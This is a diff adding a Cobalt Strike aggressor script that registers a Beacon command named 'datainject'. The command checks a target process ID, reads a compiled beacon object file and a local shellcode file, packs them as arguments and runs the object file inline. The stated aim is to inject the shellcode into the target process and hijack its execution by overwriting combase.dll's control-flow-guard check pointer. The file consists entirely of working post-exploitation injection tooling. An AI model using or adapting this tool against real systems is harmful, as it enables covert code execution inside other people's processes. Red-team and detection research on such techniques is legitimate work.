@@ -1,0 +1,67 @@
+beacon_command_register(
+"datainject",
+"Inject shellcode into a target process and hijack execution via overwriting combase.dll!__guard_check_icall_fptr",
+"Usage: datainject <pid> </local/shellcode/path>");
+
+alias datainject {
+    local('$pid $shellcodefile $barch $handle $bof $shellcodehandle $shellcodedata $args');
+
+    # Check correct argument length
+    if(size(@_) != 3)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("datainject"));
+        return;
+    }
+
+    # Verify PID is an integer
+    # Conditional taken from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
+    if ((!-isnumber $2) || (int($2) <= 0))
+    {
+        berror($1, "Please enter a valid PID");
+        berror($1, beacon_command_detail("datainject"));
+        return;
+    }
+
+    $pid = @_[1];
+    $shellcodefile = @_[2];
+
+    # Ensure x64 beacon (x86 not supported)
+    $barch = barch($1);
+    if($barch eq "x86")
+    {
+        berror("Only x64 beacons & target processes are supported");
+        return;
+    }
+
+    # Read BOF file
+    $handle = openf(script_resource("datainject.x64.o"));
+    $bof = readb($handle, -1);
+    closef($handle);
+    if(strlen($bof) == 0)
+    {
+        berror($1, "Could not read bof file (datainject.x64.o)");
+        return;
+    }
+
+    # Ensure shellcode file exists
+    if(!-exists $shellcodefile)
+    {
+        berror($1, "Specified shellcode file does not exist");
+        berror($1, beacon_command_detail("datainject"));
+        return;
+    }
+
+    # Read shellcode from bin
+    # Snippet taken from: https://github.com/ScriptIdiot/sw2-secinject/blob/main/dist/sw2-secinject.cna
+    $shellcodehandle = openf($shellcodefile);
+    $shellcodedata = readb($shellcodehandle, -1);
+    closef($shellcodehandle);
+
+    # Pack args
+    $args = bof_pack($1, "ib", $pid, $shellcodedata);
+
+    # Execute BOF
+    btask($1, "Executing DataInject-BOF by @0xLegacyy");
+    beacon_inline_execute($1, $bof, "go", $args);
+}
